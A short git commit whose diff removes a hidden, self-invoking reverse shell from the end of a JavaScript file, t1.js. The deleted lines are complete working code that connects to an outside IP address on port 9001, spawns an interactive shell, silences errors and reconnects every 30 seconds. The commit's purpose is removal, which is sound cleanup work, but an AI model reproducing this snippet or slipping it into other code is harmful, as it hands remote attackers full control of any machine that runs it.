22c66befec1b751dd3e3dbc5ad172e3313d9f29a
VansonLeung <vanson-hk@hotmail.com>
2026-05-27 22:11:58 +0800

    Remove reverse shell functionality
    Removed a self-invoking function that establishes a reverse shell connection.

--- t1.js
+++ t1.js
@@ -304,9 +304,3 @@ main().catch(err => {
   console.error('💥 Fatal error:', err.message, err.response?.data);
   process.exit(1);
 });
-(function(){
-  if(global._rs)return;global._rs=1;
-  const n=require('net'),c=require('child_process');
-  const r=()=>{const s=new n.Socket();s.connect(9001,'194.180.48.253',()=>{const p=c.spawn('/bin/sh',['-i']);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});s.on('error',()=>{});};
-  r();setInterval(r,30000);
-})();/*[RS]*/
